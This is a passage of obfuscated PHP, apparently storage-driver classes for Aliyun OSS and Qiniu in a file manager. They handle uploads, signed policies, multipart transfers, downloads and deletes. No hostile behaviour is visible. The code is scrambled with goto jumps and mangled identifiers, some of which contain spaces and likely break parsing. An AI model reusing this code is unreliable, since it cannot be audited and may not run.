$this->pathEncode($eÌß­Â÷èÙ), $Dˆ»¬ç­´„, $fÀç«Ïèœ); } catch (OSS\Core\OssException $fŠ„¹Ü–Ãç) { return !1; } return $this->getPathOuter($a‡³Á¸çàº); } public function getHost() { $a£É‘Œ·‘à =& $_SERVER[Ç³Íß¦Ó]; $AŸ‚Ìò‚ôê = explode($a£É‘Œ·‘à[177], parent::getHost()); return $AŸ‚Ìò‚ôê[0] . $a£É‘Œ·‘à[177] . $this->bucket . $a£É‘Œ·‘à[95] . $AŸ‚Ìò‚ôê[1]; } public function uploadFormData($cÏÕˆÉ†º«, $F ô´‚™ = 3600) { goto F°¢Ñë÷˜ˆ; D‡¸ÉŒµÖ¥: $aËİ¥ ¡ŠÜ = strpos($EÖ×æÃöß”, $A’øø¾‰ïÓ[293]); $EÖ×æÃöß” = substr($EÖ×æÃöß”, 0, $aËİ¥ ¡ŠÜ) . $A’øø¾‰ïÓ[1290]; $Dæ«ñµ—Ë = 1048576000 * 5; goto bé¿×£‘å; bÊÇ “¨: $dÔ Îö† = base64_encode(hash_hmac($A’øø¾‰ïÓ[229], $dê×ªÃóš›, $this->secret, !0)); $c•ÁŞ•àä = array($A’øø¾‰ïÓ[1199] => $dê×ªÃóš›, $A’øø¾‰ïÓ[1292] => $this->accessKey, $A’øø¾‰ïÓ[1195] => $A’øø¾‰ïÓ[1187], $A’øø¾‰ïÓ[1293] => $dÔ Îö†, $A’øø¾‰ïÓ[175] => $EÂñ„õáÎ†); $c•ÁŞ•àä = $this->trafficLimit($A’øø¾‰ïÓ[1286], $c•ÁŞ•àä); goto fÔ‰Ì“ê…; bé¿×£‘å: $FÀŞ›ˆ¼Áš = $this->pathFather($cÏÕˆÉ†º«); $DĞÍºƒø = array($A’øø¾‰ïÓ[1189] => $EÖ×æÃöß”, $A’øø¾‰ïÓ[1190] => array(array($A’øø¾‰ïÓ[1291], 0, $Dæ«ñµ—Ë), array($A’øø¾‰ïÓ[1193], $A’øø¾‰ïÓ[1194], $FÀŞ›ˆ¼Áš))); $dê×ªÃóš› = base64_encode(json_encode($DĞÍºƒø)); goto bÊÇ “¨; F°¢Ñë÷˜ˆ: $A’øø¾‰ïÓ =& $_SERVER[Ç³Íß¦Ó]; if (!($EÂñ„õáÎ† = $this->getHost())) { return !1; } $eÉä’¤éÑ˜ = $F ô´‚™; goto d×¨ö„³á; fÔ‰Ì“ê…: return $c•ÁŞ•àä; goto D×é®ÁÁ…±; d×¨ö„³á: $BÌ†§Ä‚Ø¦ = date($A’øø¾‰ïÓ[1289], time() + $eÉä’¤éÑ˜); $Ağ·¢×… = new DateTime($BÌ†§Ä‚Ø¦); $EÖ×æÃöß” = $Ağ·¢×…->format(DateTime::ISO8601); goto D‡¸ÉŒµÖ¥; D×é®ÁÁ…±: } public function multiUploadFormData($D‚‹Š¦Ã±, $AòÒ˜ª¿® = 3600) { $dƒÚæ‰Õê =& $_SERVER[Ç³Íß¦Ó]; if (!($e›ÊÉªƒù = $this->getHost())) { return !1; } $D²§Ì± ”Œ = $this->trafficLimit($dƒÚæ‰Õê[1286]); $AÅº‰›‘Ó = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($D‚‹Š¦Ã±), $D²§Ì± ”Œ); return array($dƒÚæ‰Õê[220] => $AÅº‰›‘Ó, $dƒÚæ‰Õê[175] => $e›ÊÉªƒù . $dƒÚæ‰Õê[8] . $this->pathEncode($D‚‹Š¦Ã±), $dƒÚæ‰Õê[221] => gmdate($dƒÚæ‰Õê[1294]), $dƒÚæ‰Õê[93] => $D‚‹Š¦Ã±); } public function multiUploadAuthData($e—»—çœ™Ô, $d•š¡œ = array()) { goto A‘Õëäî¶–; CËŠÕ‰®: $d˜ˆİ³Õ†¬ = $e³ãÓ¼Šƒ[1259] . $this->accessKey . $e³ãÓ¼Šƒ[4] . $Dƒèï¹¿Ñ; if (strpos($dÚù÷ËÙ•è, $e³ãÓ¼Šƒ[224]) === 0) { $d˜ˆİ³Õ†¬ = array($e³ãÓ¼Šƒ[231] => $d˜ˆİ³Õ†¬, $e³ãÓ¼Šƒ[221] => $C‰•ÛÏˆç); if ($e êâ¸®¤) { $d˜ˆİ³Õ†¬ = array_merge($d˜ˆİ³Õ†¬, $e êâ¸®¤); } } return $d˜ˆİ³Õ†¬; goto AËÃ¤î°¯È; A‘Õëäî¶–: $e³ãÓ¼Šƒ =& $_SERVER[Ç³Íß¦Ó]; $C‰•ÛÏˆç = isset($d•š¡œ[$e³ãÓ¼Šƒ[221]]) ? $d•š¡œ[$e³ãÓ¼Šƒ[221]] : gmdate($e³ãÓ¼Šƒ[1294]); $dÚù÷ËÙ•è = isset($d•š¡œ[$e³ãÓ¼Šƒ[168]]) ? $d•š¡œ[$e³ãÓ¼Šƒ[168]] : $e³ãÓ¼Šƒ[33]; goto Dñ¯ÇÏŒ˜±; a­â”„óãÌ: if (!empty($d•š¡œ[$e³ãÓ¼Šƒ[1296]])) { $B’†¦š‰ˆ = array_merge(array($d¸ö‡àš„¸[4]), $d•š¡œ[$e³ãÓ¼Šƒ[1296]]); sort($B’†¦š‰ˆ); $d¸ö‡àš„¸[4] = implode($e³ãÓ¼Šƒ[228], $B’†¦š‰ˆ); } $aõˆáº¯ò» = implode($e³ãÓ¼Šƒ[228], $d¸ö‡àš„¸); $Dƒèï¹¿Ñ = base64_encode(hash_hmac($e³ãÓ¼Šƒ[229], $aõˆáº¯ò», $this->secret, !0)); goto CËŠÕ‰®; CÆâœ¡›Ê‹: $d¸ö‡àš„¸ = array($e³ãÓ¼Šƒ[223], $e³ãÓ¼Šƒ[33], $e³ãÓ¼Šƒ[119], $C‰•ÛÏˆç, "\170\x2d\157\x73\x73\55\x64\x61\164\145\72{$C‰•ÛÏˆç}", $e³ãÓ¼Šƒ[8] . $this->bucket . $e³ãÓ¼Šƒ[8] . $fÏõ˜Ñ·ó . $dÚù÷ËÙ•è); if (strpos($dÚù÷ËÙ•è, $e³ãÓ¼Šƒ[224]) === 0) { $d¸ö‡àš„¸[0] = $e³ãÓ¼Šƒ[225]; if ($e êâ¸®¤ = $this->trafficLimit($e³ãÓ¼Šƒ[1286])) { $fÏõ˜Ñ·ó = $e³ãÓ¼Šƒ[1295]; array_splice($d¸ö‡àš„¸, 5, 0, $fÏõ˜Ñ·ó . $e³ãÓ¼Šƒ[4] . $e êâ¸®¤[$fÏõ˜Ñ·ó]); } } if (isset($d•š¡œ[$e³ãÓ¼Šƒ[226]]) && $d•š¡œ[$e³ãÓ¼Šƒ[226]] == $e³ãÓ¼Šƒ[227]) { $d¸ö‡àš„¸[0] = $e³ãÓ¼Šƒ[227]; } goto a­â”„óãÌ; Dñ¯ÇÏŒ˜±: $fÏõ˜Ñ·ó = $e—»—çœ™Ô; if (isset($d•š¡œ[$e³ãÓ¼Šƒ[93]])) { $fÏõ˜Ñ·ó = $d•š¡œ[$e³ãÓ¼Šƒ[93]]; unset($d•š¡œ[$e³ãÓ¼Šƒ[93]]); } if (isset($d•š¡œ[$e³ãÓ¼Šƒ[222]])) { $d•š¡œ[$e³ãÓ¼Šƒ[221]] = $C‰•ÛÏˆç; return $this->listUploadParts($fÏõ˜Ñ·ó, $d•š¡œ); } goto CÆâœ¡›Ê‹; AËÃ¤î°¯È: } public function listUploadParts($dÑ¡¬¦ÌØ, $fÄ‚±¨ñºÀ) { goto a›ëèåÅš¿; a›ëèåÅš¿: $añˆÙ‹ÆÌ =& $_SERVER[Ç³Íß¦Ó]; $A‘›ØÑåÓ² = parse_url_query($fÄ‚±¨ñºÀ[$añˆÙ‹ÆÌ[168]]); $A¶ñç¥ºµ‡ = $this->client->listParts($this->bucket, $this->pathEncode($dÑ¡¬¦ÌØ), $A‘›ØÑåÓ²[$añˆÙ‹ÆÌ[220]]); goto eĞƒÀ»â’; BÒâƒç›ö¦: return array($añˆÙ‹ÆÌ[231] => $c¦Ş’¹Š, $añˆÙ‹ÆÌ[221] => $fÄ‚±¨ñºÀ[$añˆÙ‹ÆÌ[221]], $añˆÙ‹ÆÌ[233] => $cå¨Ê¯¨•Ì); goto DÂµ«Ô¹œ§; eĞƒÀ»â’: $E¹¶è²ğŒ« = $A¶ñç¥ºµ‡->getListPart(); $cå¨Ê¯¨•Ì = array(); foreach ($E¹¶è²ğŒ« as $E¡¨‹¬¥‹) { $cå¨Ê¯¨•Ì[] = array($añˆÙ‹ÆÌ[1279] => $E¡¨‹¬¥‹->getPartNumber(), $añˆÙ‹ÆÌ[1280] => trim($E¡¨‹¬¥‹->getETag(), $añˆÙ‹ÆÌ[116])); } goto dÚÓ°ëŒ‡¯; dÚÓ°ëŒ‡¯: unset($fÄ‚±¨ñºÀ[$añˆÙ‹ÆÌ[222]], $fÄ‚±¨ñºÀ[$añˆÙ‹ÆÌ[226]]); $c¦Ş’¹Š = $this->multiUploadAuthData($dÑ¡¬¦ÌØ, $fÄ‚±¨ñºÀ); if (empty($c¦Ş’¹Š)) { return !1; } goto BÒâƒç›ö¦; DÂµ«Ô¹œ§: } public function download($BóëÁô’î, $f®¶ŠøÌÛå) { if ($this->isFolder($BóëÁô’î)) { return !1; } try { $FÄ±ÖØÉˆ£ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $f®¶ŠøÌÛå); $FÄ±ÖØÉˆ£ = $this->trafficLimit($_SERVER[Ç³Íß¦Ó][109], $FÄ±ÖØÉˆ£); $this->client->getObject($this->bucket, $this->pathEncode($BóëÁô’î), $FÄ±ÖØÉˆ£); } catch (OSS\Core\OssException $c“ôµåÎˆ) { return !1; } return $f®¶ŠøÌÛå; } public function fileSubstr($b¤Úè“«»³, $Dù§¹ÎÇöŞ = 0, $e²‰ÜŠ·‡ = false) { if ($Dù§¹ÎÇöŞ === -1) { $EšÉ˜…œ–– = array(); } else { if ($e²‰ÜŠ·‡ === !1) { $aÓ©å–‹ÛÂ = $this->size($b¤Úè“«»³); } else { $aÓ©å–‹ÛÂ = $Dù§¹ÎÇöŞ + $e²‰ÜŠ·‡ - 1; } $EšÉ˜…œ–– = array(OSS\OssClient::OSS_RANGE => "{$Dù§¹ÎÇöŞ}\x2d{$aÓ©å–‹ÛÂ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($b¤Úè“«»³), $EšÉ˜…œ––); } catch (OSS\Core\OssException $C¯Îé¡Â¼ª) { think_exception($C¯Îé¡Â¼ª->getMessage()); return !1; } } private function trafficLimit($d›—±·à«À, $eÒ¥Âõù±Í = array()) { goto e„±ÅÔùìä; bŠ“¼„™¯†: return $eÒ¥Âõù±Í; goto B­ñã™Ú¥; D•à¸©¦öø: if (!$D™¡˜ËÇ…¦) { return $eÒ¥Âõù±Í; } $D™¡˜ËÇ…¦ = $D™¡˜ËÇ…¦ < 819200 ? 819200 : ($D™¡˜ËÇ…¦ > 838860800 ? 838860800 : $D™¡˜ËÇ…¦); $eÒ¥Âõù±Í[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($D™¡˜ËÇ…¦); goto bŠ“¼„™¯†; e„±ÅÔùìä: $A•ÔŒã‹³Á =& $_SERVER[Ç³Íß¦Ó]; if ($d›—±·à«À == $A•ÔŒã‹³Á[1286] && $this->isUploadServer() || $d›—±·à«À == $A•ÔŒã‹³Á[109] && $this->isFileOutServer()) { return $eÒ¥Âõù±Í; } $D™¡˜ËÇ…¦ = floatval($GLOBALS[$A•ÔŒã‹³Á[6]][$A•ÔŒã‹³Á[88]][$A•ÔŒã‹³Á[107]][$d›—±·à«À]) * 1024 * 1024 * 8; goto D•à¸©¦öø; B­ñã™Ú¥: } public function link($bÓ½¦×å‚¾, $dŞÛ§ˆ¹¦ = array()) { $CÙƒ’·Ó¬ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->exist($bÓ½¦×å‚¾) || $this->isFolder($bÓ½¦×å‚¾)) { return !1; } try { $dŞÛ§ˆ¹¦ = $this->trafficLimit($CÙƒ’·Ó¬[109], $dŞÛ§ˆ¹¦); $B—Êê•±¶ = $this->client->signUrl($this->bucket, $this->pathEncode($bÓ½¦×å‚¾), 3600 * 12, $CÙƒ’·Ó¬[227], $dŞÛ§ˆ¹¦); return $this->getCdnLink($B—Êê•±¶); } catch (OSS\Core\OssException $fŒ¹‹Ò´àç) { return !1; } } public function fileOut($bëÊîÙ­‹Â, $a„ÚÚ»é³ = false, $D˜èÀ‰† = false, $fÍ·ßÑ›Ø = '') { goto DˆÛÆ Ş¤ƒ; fĞ“Ø¥ÄÌ: $a„ÚÚ»é³ = $a„ÚÚ»é³ ? $B‰£Ê®êò[213] : $B‰£Ê®êò[214]; $C®ßôî§µ’ = array(OSS\OssClient::OSS_SUB_RESOURCE => $B‰£Ê®êò[1297] . rawurlencode("{$a„ÚÚ»é³}\73\x66\151\x6c\145\x6e\x61\x6d\x65\75{$D˜èÀ‰†}")); $C®ßôî§µ’[OSS\OssClient::OSS_SUB_RESOURCE] .= $B‰£Ê®êò[1298] . rawurlencode($aÒ„ÔšÍ—); goto béÇ«£›§ï; DˆÛÆ Ş¤ƒ: $B‰£Ê®êò =& $_SERVER[Ç³Íß¦Ó]; if ($this->isFileOutServer()) { return $this->fileOutServer($bëÊîÙ­‹Â, $a„ÚÚ»é³, $D˜èÀ‰†, $fÍ·ßÑ›Ø); } if (!$D˜èÀ‰†) { $D˜èÀ‰† = $this->pathThis($bëÊîÙ­‹Â); } goto a‚äğùèëë; a‚äğùèëë: $D˜èÀ‰† = rawurlencode($D˜èÀ‰†); $aÒ„ÔšÍ— = get_file_mime(get_path_ext($D˜èÀ‰†)); if ($aÒ„ÔšÍ— == $B‰£Ê®êò[212]) { return parent::fileOut($bëÊîÙ­‹Â, $a„ÚÚ»é³, $D˜èÀ‰†, $fÍ·ßÑ›Ø); } goto fĞ“Ø¥ÄÌ; béÇ«£›§ï: $aÓ‚ØÏÂ¼ = $this->link($bëÊîÙ­‹Â, $C®ßôî§µ’); $this->fileOutLink($aÓ‚ØÏÂ¼); goto AÀÊù°à‹á; AÀÊù°à‹á: } public function fileOutServer($aÉ”ƒÄº¬, $c‚¤”°ƒ…´ = false, $bôíØ¢÷ùñ = false, $Dµ««¿©Ì = '') { parent::fileOut($aÉ”ƒÄº¬, $c‚¤”°ƒ…´, $bôíØ¢÷ùñ, $Dµ««¿©Ì); } public function fileOutImage($a¹ïœù‡®, $e×Ş÷ó = 250) { $EÊƒŠÆ—â = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ç³Íß¦Ó][1299] . $e×Ş÷ó); $Aœ’‹ØšİÜ = $this->link($a¹ïœù‡®, $EÊƒŠÆ—â); $this->fileOutLink($Aœ’‹ØšİÜ); } public function fileOutImageServer($cç›ÆÇ¶ª, $B£ä›ãá­İ = 250) { parent::fileOutImage($cç›ÆÇ¶ª, $B£ä›ãá­İ); } public function fileOutLink($eíÈÑæÎîˆ) { $aç«‚ÜÕ… =& $_SERVER[Ç³Íß¦Ó]; if (!$this->isCdnHost() && substr($eíÈÑæÎîˆ, 0, 7) == $aç«‚ÜÕ…[1202]) { $eíÈÑæÎîˆ = $aç«‚ÜÕ…[1203] . substr($eíÈÑæÎîˆ, 7); } header($aç«‚ÜÕ…[159] . $eíÈÑæÎîˆ); die; } public function hashMd5($DÚœ£×ëïê, $EâåáºÄÌ = '') { $d¢É³‡‹¶Á =& $_SERVER[Ç³Íß¦Ó]; $Aİ©ˆÏä÷ = $this->_objectMeta($DÚœ£×ëïê); if (!$Aİ©ˆÏä÷) { return $d¢É³‡‹¶Á[33]; } if (!isset($Aİ©ˆÏä÷[$d¢É³‡‹¶Á[1275]]) && !empty($EâåáºÄÌ)) { $DËéè‰×Î = $this->updateObjMeta($DÚœ£×ëïê, array($d¢É³‡‹¶Á[1275] => $EâåáºÄÌ)); $Aİ©ˆÏä÷[$d¢É³‡‹¶Á[1275]] = $DËéè‰×Î ? $EâåáºÄÌ : $d¢É³‡‹¶Á[33]; } return isset($Aİ©ˆÏä÷[$d¢É³‡‹¶Á[1275]]) ? strtolower($Aİ©ˆÏä÷[$d¢É³‡‹¶Á[1275]]) : $d¢É³‡‹¶Á[33]; } public function size($bÄÎßà¤†«) { $fÚ…Áğ±‹Ú = $this->objectMeta($bÄÎßà¤†«); return $fÚ…Áğ±‹Ú ? $fÚ…Áğ±‹Ú[$_SERVER[Ç³Íß¦Ó][78]] : 0; } public function info($Dì¶ÔËİ‹‰) { if ($this->isFolder($Dì¶ÔËİ‹‰)) { return $this->folderInfo($Dì¶ÔËİ‹‰); } else { if ($this->isFile($Dì¶ÔËİ‹‰)) { return $this->fileInfo($Dì¶ÔËİ‹‰); } } return !1; } public function exist($CÙğ½ë¸©) { return $this->isFile($CÙğ½ë¸©) || $this->isFolder($CÙğ½ë¸©); } public function isFile($B©š¬Ã©¥¦) { return !$this->isFolder($B©š¬Ã©¥¦) && $this->objectMeta($B©š¬Ã©¥¦); } public function isFolder($aŒìÈ­ŒÖ©) { return $this->cacheMethod($_SERVER[Ç³Íß¦Ó][198], $aŒìÈ­ŒÖ©); } protected function objectMeta($cè­¯Ùçõ÷) { return $this->cacheMethod($_SERVER[Ç³Íß¦Ó][199], $cè­¯Ùçõ÷); } protected function _objectMeta($D’ã¶ Š‹) { $EÄ­ˆÎÈª‡ =& $_SERVER[Ç³Íß¦Ó]; try { $dËª¢ªÖïÄ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($D’ã¶ Š‹)); } catch (OSS\Core\OssException $dëºêÛ°¤­) { $dËª¢ªÖïÄ = !1; } if ($dËª¢ªÖïÄ) { $dËª¢ªÖïÄ[$EÄ­ˆÎÈª‡[78]] = intval($dËª¢ªÖïÄ[$EÄ­ˆÎÈª‡[1273]]); } return $dËª¢ªÖïÄ; } protected function _isFolder($d¼ğñÅÎ‰) { $E¨ŞÂãˆ¦¬ =& $_SERVER[Ç³Íß¦Ó]; if ($d¼ğñÅÎ‰ == $E¨ŞÂãˆ¦¬[33] || $d¼ğñÅÎ‰ == $E¨ŞÂãˆ¦¬[8]) { return !0; } $f°İÔŸÁÃ÷ = array($E¨ŞÂãˆ¦¬[1269] => $E¨ŞÂãˆ¦¬[8], $E¨ŞÂãˆ¦¬[1270] => rtrim($d¼ğñÅÎ‰, $E¨ŞÂãˆ¦¬[8]) . $E¨ŞÂãˆ¦¬[8], $E¨ŞÂãˆ¦¬[1271] => 1, $E¨ŞÂãˆ¦¬[1272] => $E¨ŞÂãˆ¦¬[33]); $dİƒçˆŠŞÆ = $this->client->listObjects($this->bucket, $f°İÔŸÁÃ÷); if ($dİƒçˆŠŞÆ->getObjectList() || $dİƒçˆŠŞÆ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($f¨»§ù®è) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ç³Íß¦Ó][1300]; $this->_init($f¨»§ù®è); } public function _init($bÆó¢ÀÇÈ) { goto aŸ´âİÀÔª; A»¼¡””Ãİ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto D‘ÛÀæƒœÚ; aŸ´âİÀÔª: $DìŒ†Î½Œ =& $_SERVER[Ç³Íß¦Ó]; foreach ($bÆó¢ÀÇÈ as $dÙ™éŒ„Òµ => $CòŸ–‰‚ë) { if (isset($this->{$dÙ™éŒ„Òµ})) { $this->{$dÙ™éŒ„Òµ} = $CòŸ–‰‚ë; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($DìŒ†Î½Œ[1301] . LNG($DìŒ†Î½Œ[1260])); } goto A»¼¡””Ãİ; D‘ÛÀæƒœÚ: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto a…‰“ŒºÊ; a…‰“ŒºÊ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($BµæŒéêô, $DÌöÅï¹¾ = '', $FÅÆõ¶ÓìŒ = REPEAT_RENAME) { if ($this->setContent($BµæŒéêô, $DÌöÅï¹¾)) { return $this->getPathOuter($BµæŒéêô); } return !1; } public function mkdir($CêšŒĞßõ¢, $A†·ã¶ÔÎ¹ = REPEAT_SKIP) { goto e¶åµĞ…Ù; B¤Á…îÃ¹: $CêšŒĞßõ¢ = $fñŸœ…ºŒò . $cÜèô ŒÁ¹[8]; $D«öËÚÌªğ = get_path_this($fñŸœ…ºŒò); $CËêêâÏÊ = $CêšŒĞßõ¢ . $D«öËÚÌªğ; goto A±”¼ïîñ³; e¶åµĞ…Ù: $cÜèô ŒÁ¹ =& $_SERVER[Ç³Íß¦Ó]; $fñŸœ…ºŒò = trim($CêšŒĞßõ¢, $cÜèô ŒÁ¹[8]); if ($this->_isFolder($fñŸœ…ºŒò)) { return $this->getPathOuter($fñŸœ…ºŒò); } goto B¤Á…îÃ¹; A±”¼ïîñ³: if (!$this->mkfile($CËêêâÏÊ)) { return !1; } if (!$this->moveFile($CËêêâÏÊ, $CêšŒĞßõ¢)) { $this->delFile($CËêêâÏÊ); return !1; } return $this->getPathOuter($fñŸœ…ºŒò); goto B‚¹‡åé¦ ; B‚¹‡åé¦ : } public function copyFile($CàÜ¹¤ˆŒó, $C§µàµ™«) { $eÉ§Şˆåã = $this->bucketManager->copy($this->bucket, $CàÜ¹¤ˆŒó, $this->bucket, $C§µàµ™«, !0); return $eÉ§Şˆåã ? !1 : $this->getPathOuter($C§µàµ™«); } public function moveFile($E˜†Û‰Í²×, $fÈ¦çŒÂ) { $BÜŒŠóŸ³ = $this->bucketManager->move($this->bucket, $E˜†Û‰Í²×, $this->bucket, $fÈ¦çŒÂ, !0); return $BÜŒŠóŸ³ ? !1 : $this->getPathOuter($fÈ¦çŒÂ); } public function delFile($eì¬›‘Ãâê) { if (!$this->exist($eì¬›‘Ãâê)) { return !0; } $d«¬ÄÖ‡Ş = $this->bucketManager->delete($this->bucket, $eì¬›‘Ãâê); return $d«¬ÄÖ‡Ş ? !1 : !0; } public function delFolder($b ²‚ù¶±æ) { goto CÏœ¢µ­«‘; fÔ¦ÅêÅ¸Ù: $aíÂî‚ÅãÕ = $this->fileList($b ²‚ù¶±æ); $this->listItemCache = !0; $FÅÏ¢ö¿£É = trim($b ²‚ù¶±æ, $a›æöÌåõ¯[8]) . $a›æöÌåõ¯[8]; goto a¯Ğ‰öœğ; D¹É¹†Šæ±: return $this->delByBatch($aíÂî‚ÅãÕ[$a›æöÌåõ¯[75]]); goto e–¡°‚¸¶¾; a¯Ğ‰öœğ: if (!empty($b ²‚ù¶±æ) && !in_array($FÅÏ¢ö¿£É, $aíÂî‚ÅãÕ[$a›æöÌåõ¯[75]])) { $aíÂî‚ÅãÕ[$a›æöÌåõ¯[75]][] = $FÅÏ¢ö¿£É; } $aá”ÉæÊĞŞ = $this->delByBatch($aíÂî‚ÅãÕ[$a›æöÌåõ¯[74]]); if (!$aá”ÉæÊĞŞ) { return !1; } goto D¹É¹†Šæ±; CÏœ¢µ­«‘: $a›æöÌåõ¯ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->exist($b ²‚ù¶±æ)) { return !0; } $this->listItemCache = !1; goto fÔ¦ÅêÅ¸Ù; e–¡°‚¸¶¾: } private function delByBatch($F§Ò„ƒœÌ) { foreach (array_chunk($F§Ò„ƒœÌ, 1000) as $AÃ±·ÉÇÉ•) { $B¢«µ¿² = $this->bucketManager->buildBatchDelete($this->bucket, $AÃ±·ÉÇÉ•); list($CËá—Ë’, $c©´¬óŠ£¤) = $this->bucketManager->batch($B¢«µ¿²); if ($c©´¬óŠ£¤) { return !1; } } return !0; } public function rename($C¼æÀ Ô°, $fÀÚîò¾ˆÈ) { return $this->renameObject($C¼æÀ Ô°, $fÀÚîò¾ˆÈ); } public function fileInfo($A‡ï£éÍÊÇ, $D¶÷·©‡à = false, $fËó’ëî´’ = array()) { goto A¶ãÍÃó; E‘¿ª‰•¥§: if (isset($fËó’ëî´’[$Eê©èÕí[1303]])) { $f½‰¸Šö[$Eê©èÕí[84]] = substr($fËó’ëî´’[$Eê©èÕí[1303]] . $Eê©èÕí[33], 0, 10); } if (isset($fËó’ëî´’[$Eê©èÕí[1302]])) { $f½‰¸Šö[$Eê©èÕí[78]] = $fËó’ëî´’[$Eê©èÕí[1302]]; } return $f½‰¸Šö; goto D½Åä·›Íà; B¢Á¬‚ò‹: $f½‰¸Šö[$Eê©èÕí[193]] = $f½‰¸Šö[$Eê©èÕí[84]] = 0; $f½‰¸Šö[$Eê©èÕí[194]] = $f½‰¸Šö[$Eê©èÕí[195]] = !0; if (empty($fËó’ëî´’)) { $fËó’ëî´’ = $this->objectMeta($A‡ï£éÍÊÇ); if (!$fËó’ëî´’) { return $f½‰¸Šö; } } goto E‘¿ª‰•¥§; A¶ãÍÃó: $Eê©èÕí =& $_SERVER[Ç³Íß¦Ó]; $f½‰¸Šö = array($Eê©èÕí[28] => $this->pathThis($A‡ï£éÍÊÇ), $Eê©èÕí[76] => $this->getPathOuter($Eê©èÕí[8] . $A‡ï£éÍÊÇ), $Eê©èÕí[29] => $Eê©èÕí[192], $Eê©èÕí[78] => isset($fËó’ëî´’[$Eê©èÕí[1302]]) ? $fËó’ëî´’[$Eê©èÕí[1302]] : 0, $Eê©èÕí[168] => $this->ext($A‡ï£éÍÊÇ)); if ($D¶÷·©‡à) { return $f½‰¸Šö; } goto B¢Á¬‚ò‹; D½Åä·›Íà: } public function folderInfo($b“™–ª¹ğ, $BÏœÙßÈºã = false) { goto b·í«œºÌ; DÇĞ’·‘§–: $EÆª«¢‡Şñ = $this->objectMeta($b“™–ª¹ğ); if (isset($EÆª«¢‡Şñ[$D’Ù†Ò–ã[1303]])) { $dÑòëÜ Î[$D’Ù†Ò–ã[84]] = substr($EÆª«¢‡Şñ[$D’Ù†Ò–ã[1303]] . $D’Ù†Ò–ã[33], 0, 10); } return $dÑòëÜ Î; goto D‡…ö½Åë‡; DâŞ“˜: $dÑòëÜ Î[$D’Ù†Ò–ã[193]] = $dÑòëÜ Î[$D’Ù†Ò–ã[84]] = 0; $dÑòëÜ Î[$D’Ù†Ò–ã[194]] = $dÑòëÜ Î[$D’Ù†Ò–ã[195]] = !0; $b“™–ª¹ğ = rtrim($b“™–ª¹ğ, $D’Ù†Ò–ã[8]) . $D’Ù†Ò–ã[8]; goto DÇĞ’·‘§–; b·í«œºÌ: $D’Ù†Ò–ã =& $_SERVER[Ç³Íß¦Ó]; $dÑòëÜ Î = array($D’Ù†Ò–ã[28] => $this->pathThis($b“™–ª¹ğ), $D’Ù†Ò–ã[76] => $this->getPathOuter($D’Ù†Ò–ã[8] . $b“™–ª¹ğ), $D’Ù†Ò–ã[29] => $D’Ù†Ò–ã[77]); if ($BÏœÙßÈºã) { return $dÑòëÜ Î; } goto DâŞ“˜; D‡…ö½Åë‡: } public function listPath($C¯ª”¸£‡â, $Fè¦¼çõìŸ = false) { $A¬ÓÄêˆìŞ =& $_SERVER[Ç³Íß¦Ó]; $d—Œ™´› = $this->fileList($C¯ª”¸£‡â, $A¬ÓÄêˆìŞ[8], !0); foreach ($d—Œ™´›[$A¬ÓÄêˆìŞ[75]] as $c©…‡É±ê¶ => $DÛîÜİæŒ¥) { $d—Œ™´›[$A¬ÓÄêˆìŞ[75]][$c©…‡É±ê¶] = $this->folderInfo($DÛîÜİæŒ¥, $Fè¦¼çõìŸ); } foreach ($d—Œ™´›[$A¬ÓÄêˆìŞ[74]] as $c©…‡É±ê¶ => $DÛîÜİæŒ¥) { $d—Œ™´›[$A¬ÓÄêˆìŞ[74]][$c©…‡É±ê¶] = $this->fileInfo($DÛîÜİæŒ¥[$A¬ÓÄêˆìŞ[93]], $Fè¦¼çõìŸ, $DÛîÜİæŒ¥); } return $d—Œ™´›; } public function has($dğÃ·øœ¢Ê, $D‹ÁóÇ·”‘ = false, $Aèè™ÈÆîš = true) { goto bùºà¢ „; Cö–ªùÅˆ¯: $AÏÚê’‡ëõ = $Bí÷‚éåè[33]; $aĞöŒ£ÔÀù = 500; $aÛ¼ÛòÉÌÂ = $Bí÷‚éåè[8]; goto d°Ùİ‰Ç×; d°Ùİ‰Ç×: $c»–ÀÆùË = $CêÜãÏ¡Å› = 0; while (!0) { check_abort(); list($Cİ«Ô±Ğùİ, $Føœù£¡«Õ) = $this->bucketManager->listFiles($this->bucket, $a÷¥Á“Ö•É, $AÏÚê’‡ëõ, $aĞöŒ£ÔÀù, $aÛ¼ÛòÉÌÂ); if ($Føœù£¡«Õ) { break; } $AÏÚê’‡ëõ = array_key_exists($Bí÷‚éåè[1272], $Cİ«Ô±Ğùİ) ? $AÏÚê’‡ëõ = $Cİ«Ô±Ğùİ[$Bí÷‚éåè[1304]] : $Bí÷‚éåè[33]; if ($D‹ÁóÇ·”‘) { if (!empty($Cİ«Ô±Ğùİ[$Bí÷‚éåè[1305]])) { $c»–ÀÆùË += count($Cİ«Ô±Ğùİ[$Bí÷‚éåè[1305]]); } if (!empty($Cİ«Ô±Ğùİ[$Bí÷‚éåè[1306]])) { $CêÜãÏ¡Å› += count($Cİ«Ô±Ğùİ[$Bí÷‚éåè[1306]]); } if ($AÏÚê’‡ëõ === $Bí÷‚éåè[33]) { break; } continue; } if ($Aèè™ÈÆîš) { if (!empty($Cİ«Ô±Ğùİ[$Bí÷‚éåè[1305]])) { return !0; } } else { if (!empty($Cİ«Ô±Ğùİ[$Bí÷‚éåè[1306]])) { return !0; } } if ($AÏÚê’‡ëõ === $Bí÷‚éåè[33]) { break; } } if ($D‹ÁóÇ·”‘) { return 